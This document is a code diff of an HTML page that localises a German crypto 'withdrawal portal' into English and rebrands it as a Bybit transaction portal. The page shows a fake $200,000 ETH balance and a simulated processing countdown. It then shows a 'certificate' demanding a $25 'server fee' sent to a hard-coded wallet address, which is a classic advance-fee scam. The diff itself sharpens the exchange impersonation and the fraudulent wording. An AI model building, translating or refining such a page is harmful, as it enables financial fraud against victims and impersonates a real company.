@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="de">
+<html lang="en-AU">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Portal</title>
+    <title>Bybit • Transaction Portal</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;family=Roboto+Mono:wght@400;500&display=swap');
@@ -195,13 +195,13 @@
         <div class="account-card">
             <p style="opacity:0.8; font-size:1.05rem;">ETH Wallet • Spot</p>
             <div class="balance">$200,000</div>
-            <p style="color:#00FFAA; font-weight:500;">107 ETH • Verfügbar</p>
+            <p style="color:#00FFAA; font-weight:500;">107 ETH • Available</p>
         </div>
 
         <div class="withdrawal-section">
             <div onclick="showConfirmation()" id="withdraw-btn" class="withdrawal-circle">
                 <div class="circle-content">
-                    <h2>AUSZAHLUNG<br>FREIGEBEN</h2>
+                    <h2>RELEASE WITHDRAWAL</h2>
                     <p style="color:#0F172A; margin-top:8px;">$200,000 (107 ETH)</p>
                 </div>
             </div>
@@ -211,16 +211,16 @@
     <!-- Confirmation Modal -->
     <div id="confirm-modal" class="modal">
         <div class="modal-content">
-            <h2 class="modal-title">Empfänger-Wallet bestätigen</h2>
+            <h2 class="modal-title">Confirm Receiving Wallet</h2>
             
-            <p style="text-align:center; margin:15px 0; color:#94A3B8;">Ziel-Wallet</p>
+            <p style="text-align:center; margin:15px 0; color:#94A3B8;">Destination Wallet</p>
             <div class="wallet-box">
                 0xF3c30d013264fe212Eeb1A4a87E6f7D850afC3ef
-                <button class="copy-btn" onclick="copyWallet(this, '0xF3c30d013264fe212Eeb1A4a87E6f7D850afC3ef')">Kopieren</button>
+                <button class="copy-btn" onclick="copyWallet(this, '0xF3c30d013264fe212Eeb1A4a87E6f7D850afC3ef')">Copy</button>
             </div>
             
-            <button onclick="startWithdrawal()" class="btn btn-confirm">WALLET BESTÄTIGEN &amp; FORTFAHREN</button>
-            <button onclick="closeModal('confirm-modal')" class="btn" style="background:#334155; color:white;">ABBRECHEN</button>
+            <button onclick="startWithdrawal()" class="btn btn-confirm">CONFIRM WALLET &amp; CONTINUE</button>
+            <button onclick="closeModal('confirm-modal')" class="btn" style="background:#334155; color:white;">CANCEL</button>
         </div>
     </div>
 
@@ -228,8 +228,8 @@
     <div id="loading-overlay" class="modal">
         <div style="text-align:center;">
             <div class="spinner"></div>
-            <h3 style="margin:25px 0 10px; color:#CBD5E1;">Transaktion wird verarbeitet...</h3>
-            <p id="timer" style="font-family:'Roboto Mono',monospace; color:var(--accent);">17 Sekunden verbleibend</p>
+            <h3 style="margin:25px 0 10px; color:#CBD5E1;">Processing Transaction...</h3>
+            <p id="timer" style="font-family:'Roboto Mono',monospace; color:var(--accent);">17 seconds remaining</p>
             <div style="width:260px; background:rgba(255,255,255,0.1); border-radius:10px; margin:25px auto; overflow:hidden;">
                 <div id="progress-bar" style="height:5px; background:linear-gradient(to right, #FF9500, #FF5E00); width:0%; transition:width 0.4s linear;"></div>
             </div>
@@ -239,20 +239,20 @@
     <!-- Certificate -->
     <div id="success-modal" class="modal">
         <div class="modal-content">
-            <h2 class="modal-title">✓ Auszahlungs-Zertifikat</h2>
+            <h2 class="modal-title">✓ Withdrawal Release Certificate</h2>
             
             <div style="background:rgba(0,255,170,0.08); padding:20px; border-radius:16px; margin:20px 0; text-align:left; line-height:1.75; font-size:1.02rem;">
-                Due to low Bandwidth on the Transaction ledger a server fee of $25 will be needed to permanently register and process this payment to the user confirmed wallet.<br><br>
+                Due to low bandwidth on the transaction ledger, a server fee of $25 is required to permanently register and process this payment to the confirmed wallet.<br><br>
                 
-                Everything takes 4-6 minutes only.<br><br>
+                The entire process takes 4-6 minutes only.<br><br>
                 
                 Please send the server fee of <strong>$25</strong> to the following wallet:<br><br>
                 <strong>Fee Wallet:</strong><br>
                 <span style="font-family:'Roboto Mono'; font-size:0.95rem;">0xD4886FE35608171D02E51D3535ff9D77d8673cac</span>
-                <button onclick="copyFeeWallet()" style="margin-top:8px; padding:6px 14px; background:#FF9500; color:#0F172A; border:none; border-radius:6px; font-size:0.85rem;">Kopieren</button>
+                <button onclick="copyFeeWallet()" style="margin-top:8px; padding:6px 14px; background:#FF9500; color:#0F172A; border:none; border-radius:6px; font-size:0.85rem;">Copy Address</button>
             </div>
             
-            <button onclick="closeModal('success-modal')" class="btn btn-confirm">ZERTIFIKAT SCHLIESSEN</button>
+            <button onclick="closeModal('success-modal')" class="btn btn-confirm">CLOSE CERTIFICATE</button>
         </div>
     </div>
 
@@ -273,7 +273,7 @@
             const interval = setInterval(() => {
                 timeLeft--;
                 progress = ((17 - timeLeft) / 17) * 100;
-                timerEl.textContent = `${timeLeft} Sekunden verbleibend`;
+                timerEl.textContent = `${timeLeft} seconds remaining`;
                 progressBar.style.width = `${progress}%`;
                 
                 if (timeLeft <= 0) {
@@ -290,15 +290,15 @@
         
         function copyWallet(btn, address) {
             navigator.clipboard.writeText(address).then(() => {
-                btn.textContent = "Kopiert!";
-                setTimeout(() => btn.textContent = "Kopieren", 2000);
+                btn.textContent = "Copied!";
+                setTimeout(() => btn.textContent = "Copy", 2000);
             });
         }
         
         function copyFeeWallet() {
             const address = "0xD4886FE35608171D02E51D3535ff9D77d8673cac";
             navigator.clipboard.writeText(address).then(() => {
-                alert("Fee-Wallet kopiert: " + address);
+                alert("Fee wallet address copied!");
             });
         }
         
